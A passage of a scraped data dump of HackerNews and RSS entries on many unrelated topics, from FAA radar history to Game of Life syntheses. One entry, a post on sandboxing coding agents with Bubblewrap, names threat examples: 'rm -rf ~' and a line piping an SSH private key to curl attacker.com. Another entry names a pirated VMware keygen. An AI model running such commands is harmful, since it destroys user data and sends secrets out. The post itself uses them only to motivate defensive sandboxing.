for the rapid built-out of defense systems including\nSAGE and the air defense radar system (then thePermanent System)\nhad fatigued the national budget and Congress. The winds of the Cold War had\nonce again changed. In 1959, MITRE had begun operation of a prototype\ncivilian SAGE capability called CHARM, the CAA High Altitude Remote\nMonitor (CAA had become the FAA during the course of the CHARM effort).\nCHARM used MIT's Whirlwind computer to process high-altitude radar\ndata from the Boston ARTCC (Air Route Traffic Control Center), which it displayed to operators while\ncontinuously evaluating aircraft movements for possible conflicts. CHARM was\ndesigned for interoperability with SAGE, the ultimate goal being the addition\nof the CHARM software package to existing SAGE computers. None of that would\never happen; by the time the ball dropped for the year 1960 the Super\nCombat Center program had been almost completely canceled. SATIN, and the\nwhole idea of civilian air traffic control with SAGE, became blast damage. In 1961, the Beacon Report concluded that there was an immediate need for a\ncentralized, automated air traffic control system. Mid-air collisions had\nbecome a significant political issue, subject of congressional hearings and\nGAO reports. The FAA seemed to be failing to rise to the task of safe civilian\nATC, a perilous situation for such a new agency... and after the cancellation of\nthe SCCs, the FAA's entire plan for computerized ATC was gone. During the late 1950s and 1960s, the FAA adopted computer systems in a piecemeal\nfashion. Many enroute control centers (ARTCCs), and even some terminal facilities,\nhad some type of computer system installed. These were often custom software\nrunning on commodity computers, limited to tasks like recording flight plans and\nmaking them available to controllers at other terminals. Correlation of radar\ntargets with flight plans was generally manual, as were safety functions like\nconflict detection.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Bubblewrap: A nimble way to prevent agents from accessing your .env files", "url": "https://patrickmccanna.net/a-better-way-to-limit-claude-code-and-other-coding-agents-access-to-secrets/", "content": "Bubblewrap: A nimble way to prevent agents from accessing your .env files. Last week I wrotea thingabout how to run Claude Code when you don’t trust Claude Code. I proposed the creation of a dedicated user account & standard unix access controls. The objective was to stop Claude from dancing through your .env files, eating your secrets. There are some usability problems with that guide- I found a better approach and I wanted to share. TL;DR:Use Bubblewrap to sandbox Claude Code (and other AI agents) without trusting anyone’s implementation but your own. It’s simpler than Docker and more secure than a dedicated user account.  Bubblewrap delivers a sweet spot combination of control AND flexibility that enables experimentation. Immediately after publishing, I caught the flu. During three painful days in bed, I realized there are other better approaches.Firejailwould likely work well- but also there’s another solution calledBubblewrap. As I dug into Bubblewrap, I realized something else…Anthropic uses Bubblewrap! But Anthropic embeds bubblewrap in their client. This implementation has a major disadvantage. Embedding bubblewrap in the client means you have to trust the correctness and security of Anthropic’s implementation. They deserve credit for thinking about security, but this puzzles me. Why not publish guidance so users can secure themselves from Claude Code? Aren’t we going to need this for ALL agents? Isn’t this solution generalizable? Defense-in-depth means we don’t rely on any single vendor to execute perfectly 100% of the time. Plus, this problem applies to all coding agents, not just Claude Code. I want an approach that doesn’t tie my security to Anthropic’s destiny. Before we dive into Bubblewrap, here’s what we’re protecting against: What if Claude Code has a bug? What happens if the bug is exploited, and bubblewrap constraints embedded within the client are not activated? Will Claude Code runrm -rf ~orcat ~/.ssh/id_rsa | curl attacker.com? Without your own wrapping of the agent, you’re at risk. When you wrap your coding agent calls with Bubblewrap, the agent’s access to dangerous commands is prevented.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "(Open) Widevine support added to the OpenBSD Chromium port", "url": "https://www.undeadly.org/cgi?action=article;sid=20260118112808", "content": "(Open) Widevine support added to the OpenBSD Chromium port. Contributed byruedaon2026-01-17from the veni-vidi-vine dept. In a move likely to be welcomed by users of streaming\r\nvideo services,\r\nRobert Nagy (robert@)\r\nhasaddedaportforOpenWV(a free and\r\nopen-source reimplementation of\r\nGoogle's WidevineCDM),\r\nandenabledits use with thechromiumport: Note, however, the caveat in thepkg-readme file: Reply The link to the pkg-readme file seems bad. Try curling it, it sends you to theannoyingsite.com... Reply Reply Copyright ©2004-2008Daniel Hartmeier.\nAll rights reserved.\nArticles and comments are copyright their respective authors,\nsubmission implies license to publish on this web site.\nContents of the archive prior toApril 2nd 2004as well as images\nand HTML templates were copied from the fabulous originaldeadly.orgwithJose's andJim's kind permission.\nThis journal runs asCGIwithhttpd(8)onOpenBSD, thesource codeisBSDlicensed.\nundeadly \\Un*dead\"ly\\, a. Not subject to death; immortal. [Obs.]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Ask HN: What did you find out or explore today?", "url": "item?id=46619464", "content": "Ask HN: What did you find out or explore today?", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "TLS stripping on-device under Windows XP", "url": "https://kianbradley.com/2024/01/14/tls-on-xp.html", "content": "TLS stripping on-device under Windows XP. I managed to get modern SSL/TLS connections working under Windows XP, by running a lightweight Linux VM which strips the TLS headers and re-applies a self-signed certificate:  Much of this guide is adapted from thedockerfilefrombitbucket.org/ValdikSS/oldssl-proxy. ThanksValdikSS! I recommend using Firefox on Windows XP, it seems to have the best support for the modern web. I’m using Firefox 47.0.2. Download old versions of firefox atftp.mozilla.org/pub/firefox/releases/. Install a virtual machine software, such asVMware Workstation v9.0.1 Incl. Keymaker - EMBRACE [deepstatus]. If you want to find a torrent program that works on XP, I recommendDeluge 0.9.09. For our VM, we’ll use Alpine Linux, as it’s very lightweight and still supports 32-bit CPUs. Downloadalpine-standard-3.13.2-x86.iso. In VMware, create a new virtual machine. You can allocate 256mb RAM and a 2GB disk, maybe less. Configure the machine to use your iso file and boot.Install Alpineby runningsetup-alpine. Use the default options, but picksysas the disk partitioning option. We will useSquidto proxy the web connection. Install it: Edit the squid configuration. Run these sed commands, or use vi if you’re comfortable with it.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Sun Position Calculator", "url": "https://drajmarsh.bitbucket.io/earthsun.html", "content": "Sun Position Calculator. This page requires a reasonably modernHTML5browserwith bothJavascriptandWebGLenabled. If this message is not soon replaced by an interactive 3D model,then it is likely that your browser does not support this web app.Check yourJavaScript Consolefor specific error messages. Show a white background without stars to make screen captures better for printed mediums. Highlights the latitude and longitude angles of the current site to clearly show how positions\n                                on the Earth's surface are specified. Displays an illustrative beam of light illuminating the Earth directly from the Sun.\n                                This can be useful for more clearly indicating the direction of the Sun. A short animation that shows how the Arctic and Antarctic circles mark the extremes\n                                of night and day at each season. Another short animation that shows the tropics of Cancer and Capricorn as the extremes\n                                of solar declination angle at each of the solstices. An orthographic view where the azimuth and altitude of the camera is locked relative\n                                to the current Sun direction and changes dynamically whenever solar position changes.\n                                Click again to increment the angle, or select a different view in VIEW SETTINGS to\n                                unlock it. An orthographic side view at right angles to the site longitude, which is useful when\n                                explaining the effect of latitude as well as seasonal changes in solar altitude. Click\n                                again to swap sides or select a different view in VIEW SETTINGS to unlock it. Ordinal day of the year:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "HTTP RateLimit Headers", "url": "https://dotat.at/@/2026-01-13-http-ratelimit.html", "content": "HTTP RateLimit Headers. There is an IETF draft that aims to standardizeRateLimitheader\nfields for HTTP. ARateLimitheader in a successful response\ncan inform a client when it might expect to be throttled, so it can\navoid429 Too Many Requestserrors. Servers can also\nincludeRateLimitheaders in a 429 response to make the error more\ninformative. The draft is in reasonably good shape. However as written it seems to\nrequire (or at least it assumes) that the server uses bad quota-reset\nrate limit algorithms. Quota-reset algorithms encourage clients into\ncyclic burst-pause behaviour; the draft has several paragraphs\ndiscussing this problem. However, if we consider thatRateLimitheaders are supposed to tell\nthe client what acceptable behaviour looks like, they can be used with\nany rate limit algorithm. (And it isn’t too hard to rephrase the draft\nso that it is written in terms of client behaviour instead of server\nbehaviour.) When a client has more work to do than will fit in a single window’s\nquota, linear rate limit algorithms such as GCRA encourage the client\nto smooth out its requests nicely. In this article I’ll describe how a\nserver can use a linear rate limit algorithm with HTTPRateLimitheaders. Thedraftspecifies two headers: RateLimit-Policy:describes input parameters to a rate limit\nalgorithm, which the server chooses based on the request in some\nunspecified way. The policies are expected to be largely static\nfor a particular client. The parameters are, RateLimit:describes which policies the server applied to this\nrequest, and the output results of the rate limit algorithm. The\nresults are likely to vary per request depending on client\nbehaviour or server load, etc. The results are, Both headers can list multiple named policies. To obey a policy, the client should not make more thanqrequests\nwithinwseconds. When it receives a response containing aRateLimitheader, the client should not make more thanrrequests\nin the followingtseconds. (The draft callsrandtthe “remaining quota” and “reset time”,\nwhich assumes too much about the rate limit algorithm. I prefer to\ndescribe them as the quota and window that are currently in effect.)", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Uber Pushes to Cap Personal Injury “Billboard” Lawyer Payouts A.G. 25-0022 [pdf]", "url": "https://oag.ca.gov/system/files/initiatives/pdfs/25-0022A1%20%28Self%20Dealing%20Attorneys%29.pdf", "content": "Uber Pushes to Cap Personal Injury “Billboard” Lawyer Payouts A.G. 25-0022 [pdf]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Claude is good at assembling blocks, but still falls apart at creating them", "url": "https://www.approachwithalacrity.com/claude-ne/", "content": "Claude is good at assembling blocks, but still falls apart at creating them. Opus 4.5 is out and people cannot stop raving about it. AGI is nigh! It's a step-change in capabilities! Don't get me wrong. It's very impressive. But after trying it out in a real codebase for a few weeks, I think that view is overly simplistic. Claude is now incredibly good at assembling well-designed blocks – but it still falls apart when it has to create them. To demonstrate, I'll run through three real examples: a Sentry debugging loop where Claude ran on its own for 90 minutes and solved the problem; an AWS migration it one-shotted in three hours; and a React refactor where it proposed a hack that would have made our codebase worse. The same pattern explains all three. And in doing so, it also demonstrates what senior engineers actually do – and why we'll be safe from AGI for a long time. 🎯 The tl;dr. The most impressive thing Claude Code has done for me is debug, on its own. I was trying to attach Sentry to our system. Sentry is a wonderful service that creates nice traces of when parts of your code run. This makes it easy to figure out why it’s running slower than you expect. It's usually very easy to set up, but on this day it wasn't working. And there were no good debug logs, so the only way to figure out what was going on was to guess-and-check. I had to send a test message on our frontend, then look into the Sentry logs to see if we successfully set it up, then randomly try another approach based on the docs. It was frustrating and tedious. So I had Claude write a little testing script with Playwright that logged into our website and sent a chat. Then I had it connect to Sentry by MCP, and look for the exact codepath I was trying to debug. Finally, I gave it the Sentry docs and told it to keep plugging away until it figured it out.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "All 23-Bit Still Lifes Are Glider Constructible", "url": "https://mvr.github.io/posts/xs23.html", "content": "All 23-Bit Still Lifes Are Glider Constructible. December 27, 2025   /gol In the Game of Life, which still lifes can be produced by crashing\ngliders together? We’ve known for a few years that the answer cannot\nbe “all of them”, because in 2022 Ilkka Törmä and Ville Salofounda\npatch of still life that, if it exists in the universe, must have\nexisted since the beginning of time. And so, there is no way we could\nhave produced it out of empty space through glider collisions. Similar\nsuch patches have been found since, with the goal of optimising size\nor population, and at the time of writing therecord holderis an\nunsynthesizable still life with population 154 produced by forum user\n“400spartans”. Finding syntheses for small still lifes is easy, but at some unknown\npoint below 154 it becomes impossible. Today, we completed our\ncollaborative project to notch the lower bound up from 22 to 23, by\ngiving explicit syntheses for all 1,646,147 (strict)A still life is\nstrict when all its islands are necessary to maintain the stability of\nthe pattern.still lifes with population 23. The final holdout shown below has systematic namexs23_g88m9icz1iu146, and wassolvedby vilc. As you might imagine, this is not the first project of this kind; all\nstill lifes with 18 bits were synthesised in October 2019, 19 bits in\nFebruary 2020, 20 bits in March 2021, 21 bits in November 2022 and 22\nbits in August 2024. As the number of bits increases, the number of distinct still lifes\nexplodes exponentially, so that the 23-bit project had about 2.4× as\nmany still lifes to consider as the 22-bit project. The situation is\nactually worse than that: not only are there more problems to get\nthrough, but each additional bit reveals knotty new ways for a still\nlife to fit together. My contribution was the mass generation of synthesis recipes through\ncomputer searches. These disposed of roughly 99.97% of the targets,\nletting the people with actual synthesis talent focus on the ones\nwhere new ideas were needed. I’ll spend the rest of the post talking\nabout the things I tried. Here’s the solution for that final still life, split into steps: Solutions like this are typical: there is a natural reaction that\nproduces a large chunk of still life, and then many “synthesis\ncomponents” massage that into the target.There is an unfortunate\nclash of terminology between this kind of “component” and a connected\ncomponent of a pattern. Many of these first steps are discovered via soup searches. Sometimes,\na random soup will produce a still life of interest through the random\ncollision of some simple reagents. If we are lucky, it is possible to\nreproduce the reaction by using gliders to re-create the same\nconfiguration of reagents. We can also find first steps by randomly\ncolliding gliders directly; this was the topic of aprevious\npost.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Slop is everywhere for those with eyes to see", "url": "https://www.fromjason.xyz/p/notebook/slop-is-everywhere-for-those-with-eyes-to-see/", "content": "Slop is everywhere for those with eyes to see. The size of your plate can influence how much food you eat. The absence of a clock on a casino wall can keep you gambling through the early morning. On social media, our For You Pages give us the illusion of infinite content. How our environments are designed influences how we consume. And wouldn't you know it, everything around us is designed for maximum consumption. Open TikTok, and you can easily burn through a hundred videos or more before you glance at the time. It doesn't help that the For You Pagehides the timeon our phones. We are over consuming content on the FYP. The sudden surge of low-quality, AI-generated content, i.e. “AI slop,” is a byproduct of that overconsumption. We don't see it because, well, we're conditioned not to, but slop always arrives on time. Slop is inevitable. Slop is quintessential. Slop is everywhere for those with eyes to see. Olive oil, wasabi, saffron, vanilla, Wagyu, honey, champagne, and truffle,...reality TV, all hold examples of what happens whendemandexceedssupply— companies fill the gap with slop. The free market loves a good filler. So, why should the digital realm be any different? The For You page is designed to keep us playing the dopamine slot machine for as long as possible. The Average Time on Site metric is still the goose that lays the golden eggs, and both TikTok and Meta are reporting that their egg baskets have never been fuller. But, there's a problem. On any given platform, only 1-3% of users publish content. It's called the90-9-1 rule, and platforms that rely on free user generated content have been trying to solve this problem since the beginning of the commercialized web. The introduction of the For You Page, and the illusion of endless content, has only exacerbated the inequity. Curation used to be part of our media consumption process. We would hop from website to website looking for a laugh. We used toclick on hyperlinksfor Christ's sake. Now, all we must do is sit at the trough￼ and let daddy Zuck feed us. In arecent essay, Joan Westenberg makes a complementary argument that the algorithm has “flattened” curiosity by eliminating the need to “hunt” for our content. They go on to say: There’s a concept in behavioral science called the “effort heuristic.” It’s the idea that we tend to value information more if we worked for it. The more effort something requires, the more meaning we assign to the result. When all knowledge is made effortless, it’s treated as disposable. There’s no awe, no investment, no delight in the unexpected—only consumption. (I'm reminded of the scene in Jurassic Park when the tour Jeep pulls up to the Tyrannosaurus rex exhibit. Doctor Grant says￼“The T-Rex doesn't want to be fed. It wants to hunt.”)", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "High-Level Is the Goal", "url": "https://bvisness.me/high-level/", "content": "High-Level Is the Goal. If you have heard of the Handmade community, you likely think we are about “low-level programming” in some way. After all, we are a community inspired byHandmade Hero, a series where you learn to make a game and engine from scratch. We in the Handmade community often bemoan the state of the software industry. Modern software is slow and bloated beyond belief—our computers are literally ten times more powerful than a decade ago, yet they runworsethan they used to, purely because the software is so bad. The actual user experience has steadily declined over the years despite the insane power at our fingertips. Worst of all, people’s expectations have hit rock bottom, and everyone thinks this is normal. The Handmade crowd seems to think that low-level programming is the key to building better software. But this doesn’t really make sense on the surface. How is this practical for the average programmer? Do we really expect everyone to make their own UI frameworks and memory allocators from scratch? Do we really think you should never use libraries? Even if the average programmer could actually work that way, would anything actually improve, or would the world of software just become more fragmented? I do believe, with all my heart, that low-level programming is the path to a better future for the software industry. But the previous criticisms are valid, and should be a serious concern for the Handmade programmer. So what is the connection here? What role does “low-level” play in a better future for software? In 2019, a maker and YouTuber named Simone Giertz unveiled“Truckla”. Simone wanted an Tesla pickup truck, but the Cybertruck was still just a rumor, and she was feeling impatient. So she did what any reasonable person would do, and decided to convert a Tesla Model 3 into a pickup truck. The results speak for themselves. Truckla looks amazing, drives perfectly, and still functions  as a modern EV. This is no small feat—obviously you cannot just cut the roof off a sedan and call it a pickup truck. She and her team had to ensure that the car was structurally sound, that it could still charge, and that the software still worked as intended. Truckla is an impressive feat of engineering that took genuine creativity and craftsmanship. And yet, Truckla is still a pretty bad pickup truck! The bed size is small, it can’t haul much weight, and it’s likely much less efficient than a truck engineered from the ground up. If you were in the market for a pickup truck, you would not buy Truckla! (You probably wouldn't buy a Cybertruck either, but I digress.) Truckla is an excellent execution of a flawed idea. If you want to build a good pickup truck, you have to start with the frame. In the world of software, the equivalent of the \"frame\" is the tech stack. Software is shaped by programming languages, frameworks, libraries, and platforms in the same way that a car is shaped by its frame. If you convert a sedan into a truck, you will get a bad truck, and if you start with the wrong stack, you will get bad software. No engineering effort will be able to save you.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Roam 50GB is now Roam 100GB", "url": "https://starlink.com/support/article/58c9c8b7-474e-246f-7e3c-06db3221d34d", "content": "Roam 50GB is now Roam 100GB. What happens when I use all my Roam 100GB data? Will my service stop when I reach the 100GB data limit? What can I do with low-speed data? How do I get high-speed Roam data again? What happened to buying additional data billed per GB? I received an email about Roam 100GB. Do I have to accept or upgrade? Can I use Roam 100GB on the ocean? Why am I not seeing Roam 100GB or Roam Unlimited available to me? Roam 100GB Availability ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The spectrum of isolation: From bare metal to WebAssembly", "url": "https://buildsoftwaresystems.com/post/guide-to-execution-environments/", "content": "The spectrum of isolation: From bare metal to WebAssembly. Ever had that dreaded “but it works on my machine!” moment? The culprit is often a subtle difference in theexecution environment—the “stage” where your code performs.\nYou might be dealing with a binary linked against the wrongglibc, aPython wheelbuilt for a different architecture, or a kernel feature quietly missing in production.\nThese invisible discrepancies are what turn a successful local build into a deployment disaster. Getting the environment right is crucial for writing, testing, and shipping software reliably.\nBut the landscape is crowded with terms likevirtual machines (VM),containers,virtual environments, and more.\nWhat’s the difference, and which one should you use? We’re going to trace the evolution of the execution environment.\nWe’ll start with raw hardware and work through VMs, containers, and the various ways we isolate code at the operating system (OS) and language level.\nAlong the way, we’ll break down the trade-offs for each approach.\nBy the end, you’ll know exactly which tool to grab for your next project. The history of computing is largely a history ofresource sharing without chaos. Early systems ran one workload per machine. Today, a single server might host thousands of isolated applications owned by different teams. The unifying idea behind this evolution isisolation: separating code, dependencies, and resources so they don’t interfere with one another. But isolation is not binary. It exists on a spectrum—hardware, kernel, process, filesystem, language runtime. Each execution paradigm chooses a different point on that spectrum. Rule of thumb:any layer below your chosen isolation boundary must already be compatible—containers won’t fix a kernel mismatch, and virtual environments won’t fix a missing system library. We’ll move from the heaviest to the lightest abstractions. This is the foundation. One machine, one operating system, running your code directly on the hardware.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Intel Underestimates Error Bounds by 1.3 quintillion (2014)", "url": "https://randomascii.wordpress.com/2014/10/09/intel-underestimates-error-bounds-by-1-3-quintillion/", "content": "Intel Underestimates Error Bounds by 1.3 quintillion (2014). Intel’s manuals for their x86/x64 processor clearly state that thefsininstruction (calculating the trigonometricsine)has a maximum error, in round-to-nearest mode, of one unit in the last place. This is not true. It’s not even close. The worst-case error for thefsininstruction for small inputs is actually about 1.37 quintillion units in the last place, leaving fewer than four bits correct. For huge inputs it can be much worse, but I’m going to ignore that. I was shocked when I discovered this. Both thefsininstruction andIntel’s documentationare hugely inaccurate, and the inaccurate documentation has led to poor decisions being made. The great news is that when I shared an early version of this blog post with Intel they reacted quickly and thedocumentation is going to get fixed!  I discovered this while playing around with my favorite mathematical identity. If you add a double-precision approximation forpito thesin()of that same value then the sum of the two values (added by hand) gives you a quad-precision estimate (about 33 digits) for the value ofpi. This works because thesineof a number very close topiis almost equal to the error in the estimate ofpi. This is just calculus 101, and a variant of Newton’s method, but I still find it charming. Thesin()function in VC++ is accurate enough for this technique to work well. However this technique relies on printing the value of the double-precision approximation ofpito 33 digits, and up to VC++ 2013  this doesn’t work – the extra digits are all printed as zeroes. So, you either need custom printing code or you need to wait for Dev 14 which hasimproved printing code. So, I tried g++ on 32-bit Linux (Ubuntu 12.04) because I knew thatglibchandles the printing just fine. However the results weren’t adding up correctly. I eventually realized that thesin()function in 32-bit versions of 2.15glibcis just a thin wrappers aroundfsinand this instruction is painfully inaccurate when the input is nearpi. The first step in calculating trigonometric functions likesin()is range reduction. The input number, which Intel says can be up into the quintillion range, needs to be reduced down to between +/-pi/2. Range reduction in general is atricky problem, but range reduction aroundpiis actually very easy. You just have to subtract the input number from a sufficiently precise approximation ofpi.The worst-case for range reduction nearpiwill be the value that is closest topi. For double-precision this will be a 53-bit approximation topithat is off by, at most, half a unit in the last place (0.5 ULP). If you want to have 53 bits of accuracy in the result then you need to subtract from an approximation topithat is accurate to at least 106 bits –half the bits will cancel outbut you’ll still be left with enough.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "What if the idea of the autism spectrum is completely wrong?", "url": "https://www.newscientist.com/article/2509117-what-if-the-idea-of-the-autism-spectrum-is-completely-wrong/", "content": "What if the idea of the autism spectrum is completely wrong?. Advertisement Paul Wearing Paul Wearing “On the spectrum.” These three words have become synonymous with autism, yet behind them lies a common misunderstanding. The idea of “the spectrum” suggests that all autistic people share similar experiences and behave in similar ways – only to a greater or lesser extent. The reality couldn’t be further from the truth. Some autistic people may not speak at all; others are hyperverbal and extremely fluent. Some are highly sensitive to bright lights and noise, or the opposite. And some have rigid routines and make repetitive movements like hand-flapping, while others are more flexible but spend a lot of time on “special interests” – anything from Tudor history to Rubik’s cubes. Read moreHow to harness your emotions for a happier, calmer life Read more How to harness your emotions for a happier, calmer life Autism’s incredible diversity is something to celebrate. However, it has long presented an immense challenge to researchers trying to understand this seeming jumble of traits. Strides are now being made, as several recent studies have identified apparent groups within the catch-all term ofautismthat are also underpinned by patterns of genes and brain activity. Researchers are exploring if and how these subtypes can be leveraged to help autistic people get better, more personalised support, and gain a great understanding of themselves. “There is now a more concrete basis for understanding where their experiences are coming from,” says neuroscientistConor Listonat Weill Cornell Medicine in New York.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Fix macOS 26 (Tahoe) exaggerated rounded corners", "url": "https://github.com/makalin/CornerFix", "content": "Fix macOS 26 (Tahoe) exaggerated rounded corners", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Linux boxes via SSH: suspended when disconected", "url": "https://shellbox.dev/", "content": "Linux boxes via SSH: suspended when disconected. Instant Linux boxes via SSH. No signup, no config, no complexity. Pay only for what you use. Instant Linux boxes via SSH. Manage boxes and billing through simple commands. Minimum top-up: $10. Boxes stop when balance falls below $5, deleted at $0. Note: The -O flag is required for OpenSSH 9.0+ to use legacy SCP protocol.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Algebra will return to S.F. middle schools after more than a decade", "url": "https://www.sfchronicle.com/bayarea/article/algebra-return-sf-middle-schools-21299694.php", "content": "Algebra will return to S.F. middle schools after more than a decade", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Visual Database Schema Designer (Angular 21 and .NET 10)", "url": "https://dbvisualdesigner.com", "content": "Show HN: Visual Database Schema Designer (Angular 21 and .NET 10)", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "American Closed Source vs. Chinese Open Source: A False Dichotomy", "url": "https://senteguard.com/blog/#post-h2V9GtUh5Xts9NTzH4zu", "content": "American Closed Source vs. Chinese Open Source: A False Dichotomy. Longform updates, research notes, and security insights from SenTeGuard. Posts are published by the team\n                and moderated to keep the focus on cognitive security. When the admin publishes a post, it will appear here. Visit /blog/admin to add the first one.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The most useful indicator of your overall health", "url": "https://www.economist.com/science-and-technology/2026/01/16/the-most-useful-indicator-of-your-overall-health", "content": "The most useful indicator of your overall health", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Tldraw pauses external contributions due to AI slop", "url": "https://github.com/tldraw/tldraw/issues/7695", "content": "Tldraw pauses external contributions due to AI slop", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Claude Code with Anthropic API Compatibility [ollama blog]", "url": "https://ollama.com/blog/claude", "content": "Claude Code with Anthropic API Compatibility [ollama blog].  Ollama v0.14.0 and later are now compatible with the AnthropicMessages API, making it possible to use tools likeClaude Codewith open-source models. Run Claude Code with local models on your machine, or connect to cloud models through ollama.com. Claude Code is Anthropic’s agentic coding tool that lives in your terminal. With Anthropic API support, you can now use Claude Code with any Ollama model. Install Claude Code macOS, Linux, WSL: Windows PowerShell: Windows CMD: Connect Ollama Configure environment variables to use Ollama:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Issue #717: Unit Testing Performance, Cursor, Recursive match, and More (Jan. 13, 2026)", "url": "https://pycoders.com/issues/717", "content": "<p> <span>#717 – JANUARY 13, 2026</span><br /> <span><a href=\"https://pycoders.com/issues/717/feed\">View in Browser »</a></span> </p> <p><a href=\"https://pycoders.com\"><img alt=\"The PyCoder&rsquo;s We", "source": "RSS", "date": "2026-01-13T19:30:00+00:00", "author": null, "score": null}
{"title": "Issue #716: Performance Numbers, async Web Apps, uv Speed, and More (Jan. 6, 2026)", "url": "https://pycoders.com/issues/716", "content": "<p> <span>#716 – JANUARY 6, 2026</span><br /> <span><a href=\"https://pycoders.com/issues/716/feed\">View in Browser »</a></span> </p> <p><a href=\"https://pycoders.com\"><img alt=\"The PyCoder&rsquo;s Wee", "source": "RSS", "date": "2026-01-06T19:30:00+00:00", "author": null, "score": null}
{"title": "Issue #715: Top 5 of 2025, LlamaIndex, Python 3.15 Speed, and More (Dec. 30, 2025)", "url": "https://pycoders.com/issues/715", "content": "<p> <span>#715 – DECEMBER 30, 2025</span><br /> <span><a href=\"https://pycoders.com/issues/715/feed\">View in Browser »</a></span> </p> <p><a href=\"https://pycoders.com\"><img alt=\"The PyCoder&rsquo;s W", "source": "RSS", "date": "2025-12-30T19:30:00+00:00", "author": null, "score": null}
